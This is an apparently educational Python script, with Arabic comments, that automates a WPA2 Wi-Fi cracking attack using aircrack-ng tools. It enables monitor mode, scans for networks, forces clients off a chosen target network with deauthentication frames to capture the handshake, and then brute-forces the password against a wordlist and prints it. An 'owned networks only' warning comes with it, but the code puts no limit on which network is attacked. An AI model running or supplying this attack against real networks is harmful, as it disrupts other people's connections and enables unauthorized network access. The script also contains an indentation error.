#!/usr/bin/env python3
"""
أداة تعليمية لاختبار أمن الواي فاي باستخدام Aircrack-ng
ملاحظة: للاستخدام التعليمي والاختبار على الشبكات المملوكة لك فقط
"""

import subprocess
import time
import os
import sys

class WiFiSecurityTester:
    def __init__(self):
        self.interface = "wlan0"  # تغيير هذا ليتناسب مع واجهة الواي فاي لديك
        self.handshake_file = "handshake.cap"
        self.wordlist_file = "wordlist.txt"  # قم بتوفير قائمة كلمات مرور
        
    def check_dependencies(self):
        """التحقق من تثبيت الأدوات المطلوبة"""
        required_tools = ["aircrack-ng", "airodump-ng", "aireplay-ng"]
        for tool in required_tools:
            try:
                subprocess.run([tool, "--version"], capture_output=True, check=True)
                print(f"✓ {tool} مثبت")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print(f"✗ {tool} غير مثبت")
                return False
        return True
    
    def monitor_mode(self, enable=True):
        """تفعيل أو تعطيل وضع المراقبة"""
        try:
            if enable:
                print("تفعيل وضع المراقبة...")
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
                subprocess.run(["sudo", "airmon-ng", "start", self.interface], check=True)
                self.interface = f"{self.interface}mon"
            else:
                print("تعطيل وضع المراقبة...")
                subprocess.run(["sudo", "airmon-ng", "stop", self.interface], check=True)
                subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"خطأ في وضع المراقبة: {e}")
    
    def scan_networks(self, duration=10):
       """مسح الشبكات المتاحة"""
        print(f"جاري مسح الشبكات لمدة {duration} ثواني...")
        try:
            process = subprocess.Popen(
                ["sudo", "airodump-ng", self.interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(duration)
            process.terminate()
            
            print("تم مسح الشبكات بنجاح")
            return True
        except Exception as e:
            print(f"خطأ في المسح: {e}")
            return False
    
    def capture_handshake(self, bssid, channel):
        """التقاط مصافحة WPA2"""
        print(f"جاري التقاط مصافحة WPA2 لـ {bssid} على القناة {channel}")
        
        try:
            # بدء التقاط الحزم
            airodump_cmd = [
                "sudo", "airodump-ng",
                "-c", str(channel),
                "--bssid", bssid,
                "-w", "capture",
                self.interface
            ]
            
            airodump_process = subprocess.Popen(airodump_cmd)
            
            # انتظر قليلاً ثم أرسل طلب إلغاء المصادقة
            time.sleep(5)
            
            deauth_cmd = [
                "sudo", "aireplay-ng",
                "--deauth", "4",
                "-a", bssid,
                self.interface
            ]
            
            subprocess.run(deauth_cmd, capture_output=True)
            
            # انتظر لمدة 30 ثانية للتقاط المصافحة
            print("انتظر 30 ثانية للتقاط المصافحة...")
            time.sleep(30)
            
            airodump_process.terminate()
            
            # التحقق من وجود المصافحة
            if os.path.exists("capture-01.cap"):
                os.rename("capture-01.cap", self.handshake_file)
                print("✓ تم التقاط مصافحة WPA2 بنجاح")
                return True
            else:
                print("✗ فشل في التقاط المصافحة")
                return False
                
        except Exception as e:
            print(f"خطأ في التقاط المصافحة: {e}")
            return False
    
    def brute_force_attack(self):
        """هجوم Brute Force لكسر كلمة المرور"""
        if not os.path.exists(self.handshake_file):
            print("✗ ملف المصافحة غير موجود")
            return False
        
        if not os.path.exists(self.wordlist_file):
            print("✗ ملف قائمة كلمات المرور غير موجود")
            return False
        
        print("بدء هجوم Brute Force...")
        
        try:
            result = subprocess.run([
                "sudo", "aircrack-ng",
                self.handshake_file,
                "-w", self.wordlist_file
            ], capture_output=True, text=True)
            
            if "KEY FOUND" in result.stdout:
                print("✓ تم العثور على كلمة المرور!")
                # استخراج كلمة المرور من الناتج
                for line in result.stdout.split('\n'):
                    if "KEY FOUND" in line:
                        password = line.split(']')[-1].strip()
                        print(f"كلمة المرور هي: {password}")
                        return password
            else:
                print("✗ لم يتم العثور على كلمة المرور في القائمة")
                return False
                
        except Exception as e:
            print(f"خطأ في هجوم Brute Force: {e}")
            return False
    
    def cleanup(self):
        """تنظيف الملفات المؤقتة"""
        try:
            files_to_remove = ["capture-01.cap", "capture-01.csv", "capture-01.kismet.csv"]
            for file in files_to_remove:
                if os.path.exists(file):
                    os.remove(file)
            print("تم تنظيف الملفات المؤقتة")
        except Exception as e:
            print(f"خطأ في التنظيف: {e}")

def main():
    """الدالة الرئيسية"""
    tester = WiFiSecurityTester()
    
    print("أداة اختبار أمن الواي فاي - للأغراض التعليمية فقط")
    print("=" * 50)
    
    # التحقق من التبعيات
    if not tester.check_dependencies():
        print("يجب تثبيت الأدوات المطلوبة أولاً")
        sys.exit(1)
    
    try:
        # تفعيل وضع المراقبة
        tester.monitor_mode(enable=True)
        
        # مسح الشبكات
        if tester.scan_networks():
            # هذه المعلومات يجب الحصول عليها من المسح
            # للمثال، سنستخدم قيماً افتراضية
            bssid = input("أدخل BSSID للشبكة المستهدفة: ")
            channel = input("أدخل قناة الشبكة: ")
            
            # التقاط المصافحة
            if tester.capture_handshake(bssid, channel):
                # هجوم Brute Force
                tester.brute_force_attack()
        
    except KeyboardInterrupt:
        print("\nتم إيقاف البرنامج بواسطة المستخدم")
    finally:
        # تنظيف
        tester.cleanup()
        tester.monitor_mode(enable=False)

if __name__ == "__main__":
    # تحذير أمني
    print("تحذير: هذا البرنامج للأغراض التعليمية والاختبار على الشبكات المملوكة لك فقط.")
    print("استخدامه على شبكات الآخرين بدون إذن غير قانوني.")
    
    response = input("هل تريد المتابعة؟ (نعم/لا): ")
    if response.lower() in ['نعم', 'yes', 'y']:
        main()
    else:
        print("تم إلغاء التشغيل")
